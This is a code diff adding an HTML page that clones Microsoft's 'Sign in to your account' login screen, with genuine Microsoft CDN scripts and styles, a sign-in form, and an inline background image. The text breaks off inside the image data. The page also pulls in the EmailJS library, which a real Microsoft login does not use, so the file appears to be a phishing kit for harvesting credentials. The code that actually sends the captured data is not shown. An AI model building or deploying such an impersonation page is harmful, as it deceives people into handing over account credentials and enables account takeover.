@@ -1,0 +1,1082 @@
+<html dir="ltr" class="" lang="en">
+  <head>
+    <title>Sign in to your account</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes"
+    />
+    <meta http-equiv="Pragma" content="no-cache" />
+    <meta http-equiv="Expires" content="-1" />
+    <link rel="preconnect" href="https://aadcdn.msftauth.net" crossorigin="" />
+    <meta http-equiv="x-dns-prefetch-control" content="on" />
+    <link rel="dns-prefetch" href="//aadcdn.msftauth.net" />
+    <link rel="dns-prefetch" href="//aadcdn.msauth.net" />
+
+    <meta name="PageID" content="ConvergedSignIn" />
+    <meta name="SiteID" content="" />
+    <meta name="ReqLC" content="2057" />
+    <meta name="LocLC" content="en-GB" />
+
+    <meta name="format-detection" content="telephone=no" />
+
+    <noscript>
+      <meta
+        http-equiv="Refresh"
+        content="0; URL=https://login.microsoftonline.com/jsdisabled"
+      />
+    </noscript>
+
+    <meta name="robots" content="none" />
+
+    <script type="text/javascript" nonce="">
+      //<![CDATA[
+      !(function (t, e) {
+        !(function () {
+          var n = e.getElementsByTagName("head")[0];
+          n &&
+            n.addEventListener &&
+            (n.addEventListener(
+              "error",
+              function (e) {
+                null !== e.target &&
+                  "cdn" === e.target.getAttribute("data-loader") &&
+                  t.$Loader.OnError(e.target);
+              },
+              !0,
+            ),
+            n.addEventListener(
+              "load",
+              function (e) {
+                null !== e.target &&
+                  "cdn" === e.target.getAttribute("data-loader") &&
+                  t.$Loader.OnSuccess(e.target);
+              },
+              !0,
+            ));
+        })();
+      })(window, document);
+      //]]>
+    </script>
+
+    <!-- <link rel="prefetch" href="https://login.live.com/Me.htm?v=3" /> -->
+    <link
+      rel="shortcut icon"
+      href="https://aadcdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico"
+    />
+
+    <script type="text/javascript" nonce="">
+      ServerData = $Config;
+    </script>
+
+    <link
+      data-loader="cdn"
+      crossorigin="anonymous"
+      href="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/converged.v2.login.min_wyfpxtvrgudp2mrjlpyxva2.css"
+      rel="stylesheet"
+    />
+
+    <script
+      data-loader="cdn"
+      crossorigin="anonymous"
+      src="https://aadcdn.msftauth.net/shared/1.0/content/js/ConvergedLogin_PCore_5y4HVEmNnH7OmA74gUBcIQ2.js"
+      integrity="sha384-BMuKJB9g9I6tnvjv1LWRmZfMzH9RVLE6B6wJ/fqYVWZvJBhdKbcEL25iDcHfVTVj"
+      nonce=""
+    ></script>
+    <script
+      charset="utf-8"
+      nonce=""
+      src="https://aadcdn.msftauth.net/shared/1.0/content/js/oneDs_f891683d1850d7ab47e8.js"
+    ></script>
+
+    <script
+      data-loader="cdn"
+      crossorigin="anonymous"
+      src="https://aadcdn.msftauth.net/ests/2.1/content/cdnbundles/ux.converged.login.strings-en-gb.min_ct3aa2ezf6q2h4frfjyy_g2.js"
+      nonce=""
+    ></script>
+
+    <script
+      charset="utf-8"
+      nonce=""
+      src="https://aadcdn.msftauth.net/shared/1.0/content/js/asyncchunk/convergedlogin_pcustomizationloader_70118bd98f4e33f9b057.js"
+    ></script>
+    <script
+      charset="utf-8"
+      nonce=""
+      src="https://aadcdn.msftauth.net/shared/1.0/content/js/asyncchunk/convergedlogin_pfetchsessionsprogress_c29cd4070066a992a443.js"
+    ></script>
+    <script
+      charset="utf-8"
+      nonce=""
+      src="https://aadcdn.msftauth.net/shared/1.0/content/js/asyncchunk/convergedlogin_pstringcustomizationhelper_754c5f5e6fb1302ec276.js"
+    ></script>
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"
+    ></script>
+  </head>
+
+  <body
+    data-bind="defineGlobals: ServerData, bodyCssClass"
+    class="cb"
+    style="display: block"
+  >
+    <script type="text/javascript" nonce="">
+      //<![CDATA[
+      !(function () {
+        var e = window,
+          s = e.document,
+          i = e.$Config || {};
+        if (e.self === e.top) {
+          s && s.body && (s.body.style.display = "block");
+        } else if (!i.allowFrame) {
+          var o, t, r, f, n, d;
+          if (i.fAddTryCatchForIFrameRedirects) {
+            try {
+              ((o = e.self.location.href),
+                (t = o.indexOf("#")),
+                (r = -1 !== t),
+                (f = o.indexOf("?")),
+                (n = r ? t : o.length),
+                (d = -1 === f || (r && f > t) ? "?" : "&"),
+                (o =
+                  o.substr(0, n) +
+                  d +
+                  "iframe-request-id=" +
+                  i.sessionId +
+                  o.substr(n)),
+                (e.top.location = o));
+            } catch (e) {}
+          } else {
+            ((o = e.self.location.href),
+              (t = o.indexOf("#")),
+              (r = -1 !== t),
+              (f = o.indexOf("?")),
+              (n = r ? t : o.length),
+              (d = -1 === f || (r && f > t) ? "?" : "&"),
+              (o =
+                o.substr(0, n) +
+                d +
+                "iframe-request-id=" +
+                i.sessionId +
+                o.substr(n)),
+              (e.top.location = o));
+          }
+        }
+      })();
+      //]]>
+    </script>
+
+    <div>
+      <!--  -->
+
+      <!--  -->
+
+      <div data-bind="if: activeDialog"></div>
+
+      <form
+        name="f1"
+        id="i0281"
+        novalidate="novalidate"
+        spellcheck="false"
+        target="_top"
+        autocomplete="on"
+        data-bind="visible: !isLoginPageHidden(), autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: !!activeDialog(), css: { 'provide-min-height': svr.fUseMinHeight }"
+        action="#"
+        class="provide-min-height"
+      >
+        <!-- ko withProperties: { '$loginPage': $data } -->
+        <div
+          class="login-paginated-page"
+          data-bind="component: { name: 'master-page',
+        publicMethods: masterPageMethods,
+        params: {
+            serverData: svr,
+            showButtons: svr.fShowButtons,
+            showFooterLinks: true,
+            useWizardBehavior: svr.fUseWizardBehavior,
+            handleWizardButtons: false,
+            password: password,
+            hideFromAria: ariaHidden },
+        event: {
+            footerAgreementClick: footer_agreementClick } }"
+        >
+          <!--  -->
+
+          <!-- ko ifnot: useLayoutTemplates --><!-- /ko -->
+
+          <!-- ko if: useLayoutTemplates -->
+          <!-- ko withProperties: { '$page': $parent } -->
+          <!-- ko if: isLightboxTemplate() -->
+          <div
+            id="lightboxTemplateContainer"
+            data-bind="component: { name: 'lightbox-template', params: { serverData: svr, showHeader: $page.showHeader(), headerLogo: $page.headerLogo() } }, css: { 'provide-min-height': svr.fUseMinHeight }"
+            class="provide-min-height"
+          >
+            <!--  -->
+
+            <div
+              id="lightboxBackgroundContainer"
+              data-bind="css: { 'provide-min-height': svr.fUsePlaywrightMinHeight },
+    component: { name: 'background-image-control',
+        publicMethods: $page.backgroundControlMethods,
+        event: { load: $page.backgroundImageControl_onLoad } }"
+            >
+              <div
+                class="background-image-holder"
+                role="presentation"
+                data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"
+              >
+                <!-- ko if: smallImageUrl --><!-- /ko -->
+
+                <!-- ko if: backgroundImageUrl -->
+                <img
+                  src="data:image/jpeg;base64,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